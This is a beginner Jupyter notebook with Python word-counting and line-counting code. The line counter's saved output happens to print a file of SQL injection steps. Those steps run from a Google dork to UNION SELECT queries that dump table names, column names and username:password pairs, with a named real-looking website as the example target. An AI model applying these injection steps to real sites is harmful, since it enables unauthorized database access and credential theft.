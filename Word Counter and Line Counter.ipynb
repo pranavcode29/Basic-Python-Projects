{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d2b79c48",
   "metadata": {},
   "source": [
    "# Basic Python Projects"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3b750ae6",
   "metadata": {},
   "source": [
    "##  1. Word Count from Text\n",
    "\n",
    "###  Steps for the  Word Counter"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f8ede5f",
   "metadata": {},
   "source": [
    "### 1. In this first I defined a function named count_words that takes a file path as an argument.\n",
    "### 2. Then, this  function tries to open the file which is given by the user and read its content.\n",
    "### 3. Then content is split into words using .split() function and the word count is returned.\n",
    "### 4. If the file is found some error, then it will return this message \"File Not Found\"\n",
    "### 5. Then the main part of the code assigns the file path and then calls the count_words function to count and print the word count."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "c811b256",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter a file path : C:\\Users\\Raj Kumar Vij\\Downloads\\dataset.txt\n",
      "Word count: 2039\n"
     ]
    }
   ],
   "source": [
    "def count_words(file_path):\n",
    "    try:\n",
    "        with open(file_path, 'r') as file:\n",
    "            content = file.read()\n",
    "            words = content.split()\n",
    "            return len(words)\n",
    "    except FileNotFoundError:\n",
    "        print(\"File not found.\")\n",
    "        return 0\n",
    "\n",
    "file_path = input(\"Enter a file path : \")\n",
    "word_count = count_words(file_path)\n",
    "print(f\"Word count: {word_count}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f9cfd605",
   "metadata": {},
   "source": [
    "## 2.  Line count from Text\n",
    "\n",
    "### Steps for Line Counter"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f37c68d3",
   "metadata": {},
   "source": [
    "### 1. The program prompts the user to input a file path. The input function returns the user's input as a string and assigns it to the variable file_path.\n",
    "### 2. Then, code opens the file specified by the file_path variable in read mode (\"r\"). This means the file will be opened for reading its content.\n",
    "### 3. This loop reads the content of the file line by line. For each line, it prints the line using print(x) and then appends a list of words (obtained by splitting the line on spaces) to the list 'c'. Each line is split into words using the split(' ') function, which separates the line's content wherever it encounters a space. The resulting list of words is appended to 'c'.\n",
    "### 4. Then we use close() method which ensures that the file resources are released and the file is properly closed.\n",
    "### 5. Then loop iterates through each element (list of words) in the list 'c'. For each element, it increments the value of d by 1. After the loop, the variable d holds the total number of lines in the file.Then code print out the total number of lines and the total number of elements (which is equivalent to the number of lines) in the list 'c'."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "ed9bd9aa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter file path: C:\\Users\\Raj Kumar Vij\\Downloads\\steps of finding sqli (2).txt\n",
      "STEP 1 . PARAMETER FINDING\n",
      "\n",
      "ex. inurl:php?id= site: .pk\n",
      "\n",
      " \n",
      "\n",
      "STEP 2. SQL INJECTION \n",
      "\n",
      "EX. http://www.belbana.com/our-products-detail.php?id=7'\n",
      "\n",
      "\n",
      "\n",
      "STEP 3.CASES OF QUERY BALANCING \n",
      "\n",
      " (i). --\n",
      "\n",
      " (ii). -- -\n",
      "\n",
      " (iii).-- +\n",
      "\n",
      " (iv). -- +-\n",
      "\n",
      " php?id=1 -- -\n",
      "\n",
      "EX.http://www.belbana.com/our-products-detail.php?id=7' -- - \n",
      "\n",
      "\n",
      "\n",
      "STEP 4 FINDING COLUMN WWITH ORDER BY \n",
      "\n",
      "\n",
      "\n",
      "STEP 5 UNION SELECT = 1,2,3,4,5,6,7,8,9,(database(),version(),user())\n",
      "\n",
      "\n",
      "\n",
      "STEP 6 FIND TABELS\n",
      "\n",
      "group_concat(table_name,<br>)       - vuln column\n",
      "\n",
      " from information_schema.tables where table_schema=database()\n",
      "\n",
      " \n",
      "\n",
      "STEP  7 find columns\n",
      "\n",
      "group_concat(column_name,<br>)      - vuln column\n",
      "\n",
      "from information_schema.columns where table_name=users -> convert into  ohex\n",
      "\n",
      "\n",
      "\n",
      "step 8 \n",
      "\n",
      "group_concat(username,0x3a,password)\n",
      "\n",
      "from users\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "Total lines: 38\n",
      "Total elements in 'c': 38\n"
     ]
    }
   ],
   "source": [
    "file_path = input(\"Enter file path: \")  # Input the file path from the user\n",
    "f = open(file_path, \"r\")  # Open the file in read mode\n",
    "c = []\n",
    "\n",
    "for x in f:\n",
    "    print(x)\n",
    "    c.append(x.split(' '))\n",
    "\n",
    "f.close()  # It's important to close the file after reading\n",
    "\n",
    "d = 0\n",
    "for i in range(len(c)):\n",
    "    d = d + 1\n",
    "\n",
    "print(\"Total lines:\", d)  # Print the total number of lines\n",
    "print(\"Total elements in 'c':\", len(c))  # Print the total elements in 'c'\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a7057ad",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
